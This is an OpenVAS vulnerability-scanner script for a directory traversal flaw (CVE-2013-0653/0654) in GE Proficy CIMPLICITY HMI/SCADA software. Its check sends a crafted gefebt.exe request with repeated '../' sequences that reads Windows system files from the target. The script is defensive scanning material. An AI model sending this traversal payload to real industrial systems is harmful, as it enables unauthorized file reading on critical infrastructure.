###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ge_intelligent_mult_vulns_09_13.nasl 11 2013-10-27 10:12:02Z jan $
#
# GE Intelligent Platforms Proficy Cimplicity Multiple Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103785";

tag_insight = "General Electric (GE) has addressed two vulnerabilities in GE Intelligent
Platforms Proficy HMI/SCADA-CIMPLICITY: a directory transversal vulnerability and improper
input validation vulnerability.
GE has released two security advisories (GEIP12-13 and GEIP12-19) available on the GE
Intelligent Platforms support Web site to inform customers about these
vulnerabilities.";

tag_impact = "If the vulnerabilities are exploited, they could allow an unauthenticated remote
attacker to cause the CIMPLICITY built-in Web server to crash or to run arbitrary commands on
a server running the affected software, or could potentially allow an attacker to take control
of the CIMPLICITY server.";

tag_affected = "GE Intelligent Platforms Proficy HMI/SCADA - CIMPLICITY 4.01 through 8.0, and
Proficy Process Systems with CIMPLICITY";

tag_summary = "GE Intelligent Platforms Proficy Cimplicity is prone to multiple Vulnerabilities";

tag_solution = "Updates are available.";
tag_vuldetect = "Send a maliciously crafted HTTP request to read a local file.";

if (description)
{
 script_oid(SCRIPT_OID);
 script_cve_id("CVE-2013-0653","CVE-2013-0654");
 script_tag(name:"cvss_base", value:"8.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:C/A:C");
 script_version ("$Revision: 11 $");

 script_name("GE Intelligent Platforms Proficy Cimplicity Multiple Vulnerabilities");

 desc = "
Summary:
" + tag_summary + "

Vulnerability Detection:
" + tag_vuldetect + "

Vulnerability Insight:
" + tag_insight + "

Impact:
" + tag_impact + "

Affected Software/OS:
" + tag_affected + "

Solution:
" + tag_solution;

 script_xref(name:"URL", value:"http://ics-cert.us-cert.gov/advisories/ICSA-13-022-02");
 script_xref(name:"URL", value:"http://support.ge-ip.com/support/index?page=kbchannel&amp;id=S:KB15153");
 script_xref(name:"URL", value:"http://support.ge-ip.com/support/index?page=kbchannel&amp;id=S:KB15244");
 
 script_tag(name:"risk_factor", value:"Critical");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
 script_tag(name:"creation_date", value:"2013-09-11 14:38:23 +0200 (Wed, 11 Sep 2013)");
 script_description(desc);
 script_summary("Determine if it is possible to read a local file");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "affected" , value : tag_affected);
  }

 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

banner = get_http_banner(port:port);
if("Server: CIMPLICITY" >!< banner)exit(0);

dirs = make_list("/CimWeb",cgi_dirs());

files = traversal_files('windows');

foreach dir (dirs) {
   
  url = dir + '/index.html';

  if(http_vuln_check(port:port, url:url, pattern:"gefebt.exe")) {

    foreach file(keys(files)) {

      url = dir + '/gefebt.exe?substitute.bcl+FILE=' + crap(data:"../",length:6*9) + files[file];

      if(http_vuln_check(port:port, url:url, pattern:file, check_header:TRUE)) {
        security_hole(port:port);
        exit(0);
      }  

    }  
  }
}

exit(0);

